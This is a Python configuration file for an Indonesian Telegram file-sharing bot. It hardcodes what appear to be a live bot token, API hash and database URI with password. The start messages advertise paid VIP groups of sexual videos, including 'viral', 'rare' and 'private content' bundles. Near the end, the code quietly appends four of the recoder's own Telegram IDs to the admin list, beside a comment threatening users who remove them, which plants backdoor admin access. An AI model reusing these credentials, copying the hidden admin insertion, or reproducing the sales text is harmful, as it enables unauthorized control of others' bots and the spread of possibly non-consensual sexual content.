# (©)Codexbotz
# Recode by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de

import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "7113112720:AAG7CJZSl4uZBJHXKaONPI1oC-zL9DEwXr8")

# API ID Anda dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "11381402"))

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "349d6f6868d82dc82c7a9b356051f035")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1002045371636"))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "0")

# Protect Content
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "True"))

# Heroku Credentials for updater.
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# Custom Repo for updater.
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")

# Database
DB_URI = os.environ.get("DATABASE_URL", "postgres://etaksoan:73IUccEW8CNRqlGNUg08_E0F_IxYHUN9@babar.db.elephantsql.com/etaksoan")

# ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "-1001642572481"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗝𝗢𝗜𝗡 𝗞𝗘 𝗖𝗛𝗔𝗡𝗘𝗟 & 𝗚𝗥𝗢𝗨𝗣 𝗧𝗘𝗥𝗟𝗘𝗕𝗜𝗛 𝗗𝗔𝗛𝗨𝗟𝗨 𝗨𝗡𝗧𝗨𝗞 𝗠𝗘𝗡𝗗𝗔𝗣𝗔𝗧𝗞𝗔𝗡 𝗩𝗜𝗗𝗘𝗢𝗡𝗬𝗔🥵</b>\n\n<b>𝙽𝙾𝙽𝚃𝙾𝙽 𝚃𝙰𝙽𝙿𝙰 𝙱𝙾𝚃/𝙻𝙸𝙽𝙺 !!</b>\n<b>𝚂𝙴𝙳𝙸𝙰 𝚁𝙸𝙱𝚄𝙰𝙽 𝚅𝙸𝙳𝙴𝙾 𝚅𝙸𝚁𝙰𝙻&𝚁𝙰𝚁𝙴 !! 𝙶𝙰𝚁𝙰𝙽𝚂𝙸 𝙹𝙸𝙺𝙰 𝙶𝚁𝚄𝙿 𝙺𝙴 𝙱𝙰𝙽𝙽𝙴𝙳, 𝙰𝙺𝙰𝙽 𝙺𝙰𝙼𝙸 𝙸𝙽𝚅𝙸𝚃𝙴 𝙻𝙰𝙶𝙸 !! 𝙲𝚄𝙺𝚄𝙿 𝚂𝙴𝙺𝙰𝙻𝙸 𝙱𝙰𝚈𝙰𝚁 𝙿𝙴𝚁𝙼𝙰𝙽𝙴𝙽 !!</b>\n\n<b>📍𝙻𝙸𝚂𝚃 𝚅𝙸𝙿📍</b>\n<b>1.𝚅𝙸𝙿 𝙸𝙽𝙳𝙾 50𝙺</b>\n<b>2.𝚅𝙸𝙿 𝙷𝙸𝙹𝙰𝙱 50𝙺</b>\n<b>3.𝚅𝙸𝙿 𝙻𝙸𝚅𝙴𝚁𝙴𝙲𝙾𝚁𝙳 50𝙺</b>\n<b>4.𝚅𝙸𝙿 𝙹𝙰𝚅 & 𝙰𝚂𝙸𝙰𝙽 50𝙺</b>\n\n<b>📍𝙻𝙸𝚂𝚃 𝚅𝚅𝙸𝙿📍</b>\n<b>1.𝚅𝚅𝙸𝙿 𝙲𝙰𝙼𝙿𝚄𝚁𝙰𝙽 70𝙺</b>\n<b>2.𝚅𝚅𝙸𝙿 𝚅𝙸𝚁𝙰𝙻 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 100𝙺</b>\n<b>3.𝚅𝚅𝙸𝙿 𝚂𝚄𝙿𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙸𝚂𝙸 37000 𝚅𝙸𝙳𝙴𝙾 200𝙺</b>\n<b>4.𝚅𝚅𝙸𝙿 𝚃𝙰𝙻𝙴𝙽𝚃 𝙺𝙾𝙽𝚃𝙴𝙽 𝙿𝚁𝙸𝙱𝙰𝙳𝙸 200𝙺</b>\n\n<b>📍𝙿𝙰𝙺𝙴𝚃 𝙱𝙾𝚂𝙺𝚄𝙷 𝙱𝙴𝙱𝙰𝚂 𝙿𝙸𝙻𝙸𝙷📍</b>\n<b>𝙹𝙾𝙸𝙽 1 𝚅𝚅𝙸𝙿 + 2 𝚅𝙸𝙿=170𝙺💵</b>\n<b>𝙹𝙾𝙸𝙽 1 𝚅𝚅𝙸𝙿 + 3 𝚅𝙸𝙿=200𝙺💵</b>\n<b>𝙹𝙾𝙸𝙽 1 𝚅𝚅𝙸𝙿 + 4 𝚅𝙸𝙿=250𝙺💵</b>\n<b>(𝚃𝙸𝙳𝙰𝙺 𝚃𝙴𝚁𝙼𝙰𝚂𝚄𝙺 𝚅𝚅𝙸𝙿 𝚃𝙰𝙻𝙴𝙽𝚃 𝙺𝙾𝙽𝚃𝙴𝙽 𝙿𝚁𝙸𝙱𝙰𝙳𝙸 & 𝚅𝚅𝙸𝙿 𝚂𝚄𝙿𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼)</b>\n\n<b>📍𝙿𝙰𝙺𝙴𝚃 𝙱𝙸𝙶𝙱𝙾𝚂 𝙰𝙻𝙻 𝙶𝚁𝚄𝙿📍</b>\n<b>𝙹𝙾𝙸𝙽 4𝚅𝙸𝙿 + 4𝚅𝚅𝙸𝙿 = 500𝙺💵</b>\n\n<b>𝙼𝙴𝚃𝙾𝙳𝙴 𝙿𝙴𝙼𝙱𝙰𝚈𝙰𝚁𝙰𝙽</b>\n<b>💸𝙳𝙰𝙽𝙰</b>\n<b>💸SHOPAY</b>\n<b>💸𝚁𝙴𝙺 𝙱𝙲𝙰</b>\n<b>💸𝙶𝙾𝙿𝙰𝚈</b>\n\n<b>‼️FAST RESPON KETIK‼️</b>\n<b>MIN JOIN VIP</b>\n\n<b>☎️𝙼𝙸𝙽𝙰𝚃 𝙷𝚄𝙱 @bohaybanget</b>\n<b>☎️𝚃𝙴𝚂𝚃𝙸𝙼𝙾𝙽𝙸 @testivipvinkha</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "6673291992 6094633455").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan Saat Memaksa Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗝𝗢𝗜𝗡 𝗞𝗘 𝗖𝗛𝗔𝗡𝗘𝗟 & 𝗚𝗥𝗢𝗨𝗣 𝗧𝗘𝗥𝗟𝗘𝗕𝗜𝗛 𝗗𝗔𝗛𝗨𝗟𝗨 𝗨𝗡𝗧𝗨𝗞 𝗠𝗘𝗡𝗗𝗔𝗣𝗔𝗧𝗞𝗔𝗡 𝗩𝗜𝗗𝗘𝗢𝗡𝗬𝗔🥵</b>\n\n<b>𝙽𝙾𝙽𝚃𝙾𝙽 𝚃𝙰𝙽𝙿𝙰 𝙱𝙾𝚃/𝙻𝙸𝙽𝙺 !!</b>\n<b>𝚂𝙴𝙳𝙸𝙰 𝚁𝙸𝙱𝚄𝙰𝙽 𝚅𝙸𝙳𝙴𝙾 𝚅𝙸𝚁𝙰𝙻&𝚁𝙰𝚁𝙴 !! 𝙶𝙰𝚁𝙰𝙽𝚂𝙸 𝙹𝙸𝙺𝙰 𝙶𝚁𝚄𝙿 𝙺𝙴 𝙱𝙰𝙽𝙽𝙴𝙳, 𝙰𝙺𝙰𝙽 𝙺𝙰𝙼𝙸 𝙸𝙽𝚅𝙸𝚃𝙴 𝙻𝙰𝙶𝙸 !! 𝙲𝚄𝙺𝚄𝙿 𝚂𝙴𝙺𝙰𝙻𝙸 𝙱𝙰𝚈𝙰𝚁 𝙿𝙴𝚁𝙼𝙰𝙽𝙴𝙽 !!</b>\n\n<b>📍𝙻𝙸𝚂𝚃 𝚅𝙸𝙿📍</b>\n<b>1.𝚅𝙸𝙿 𝙸𝙽𝙳𝙾 50𝙺</b>\n<b>2.𝚅𝙸𝙿 𝙷𝙸𝙹𝙰𝙱 50𝙺</b>\n<b>3.𝚅𝙸𝙿 𝙻𝙸𝚅𝙴𝚁𝙴𝙲𝙾𝚁𝙳 50𝙺</b>\n<b>4.𝚅𝙸𝙿 𝙹𝙰𝚅 & 𝙰𝚂𝙸𝙰𝙽 50𝙺</b>\n\n<b>📍𝙻𝙸𝚂𝚃 𝚅𝚅𝙸𝙿📍</b>\n<b>1.𝚅𝚅𝙸𝙿 𝙲𝙰𝙼𝙿𝚄𝚁𝙰𝙽 70𝙺</b>\n<b>2.𝚅𝚅𝙸𝙿 𝚅𝙸𝚁𝙰𝙻 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 100𝙺</b>\n<b>3.𝚅𝚅𝙸𝙿 𝚂𝚄𝙿𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙸𝚂𝙸 37000 𝚅𝙸𝙳𝙴𝙾 200𝙺</b>\n<b>4.𝚅𝚅𝙸𝙿 𝚃𝙰𝙻𝙴𝙽𝚃 𝙺𝙾𝙽𝚃𝙴𝙽 𝙿𝚁𝙸𝙱𝙰𝙳𝙸 200𝙺</b>\n\n<b>📍𝙿𝙰𝙺𝙴𝚃 𝙱𝙾𝚂𝙺𝚄𝙷 𝙱𝙴𝙱𝙰𝚂 𝙿𝙸𝙻𝙸𝙷📍</b>\n<b>𝙹𝙾𝙸𝙽 1 𝚅𝚅𝙸𝙿 + 2 𝚅𝙸𝙿=170𝙺💵</b>\n<b>𝙹𝙾𝙸𝙽 1 𝚅𝚅𝙸𝙿 + 3 𝚅𝙸𝙿=200𝙺💵</b>\n<b>𝙹𝙾𝙸𝙽 1 𝚅𝚅𝙸𝙿 + 4 𝚅𝙸𝙿=250𝙺💵</b>\n<b>(𝚃𝙸𝙳𝙰𝙺 𝚃𝙴𝚁𝙼𝙰𝚂𝚄𝙺 𝚅𝚅𝙸𝙿 𝚃𝙰𝙻𝙴𝙽𝚃 𝙺𝙾𝙽𝚃𝙴𝙽 𝙿𝚁𝙸𝙱𝙰𝙳𝙸 & 𝚅𝚅𝙸𝙿 𝚂𝚄𝙿𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼)</b>\n\n<b>📍𝙿𝙰𝙺𝙴𝚃 𝙱𝙸𝙶𝙱𝙾𝚂 𝙰𝙻𝙻 𝙶𝚁𝚄𝙿📍</b>\n<b>𝙹𝙾𝙸𝙽 4𝚅𝙸𝙿 + 4𝚅𝚅𝙸𝙿 = 500𝙺💵</b>\n\n<b>𝙼𝙴𝚃𝙾𝙳𝙴 𝙿𝙴𝙼𝙱𝙰𝚈𝙰𝚁𝙰𝙽</b>\n<b>💸𝙳𝙰𝙽𝙰</b>\n<b>💸SHOPAY</b>\n<b>💸𝚁𝙴𝙺 𝙱𝙲𝙰</b>\n<b>💸𝙶𝙾𝙿𝙰𝚈</b>\n\n<b>‼️FAST RESPON KETIK‼️</b>\n<b>MIN JOIN VIP</b>\n\n<b>☎️𝙼𝙸𝙽𝙰𝚃 𝙷𝚄𝙱 @bohaybanget</b>\n<b>☎️𝚃𝙴𝚂𝚃𝙸𝙼𝙾𝙽𝙸 @testivipvinkha</b>",
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))

# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
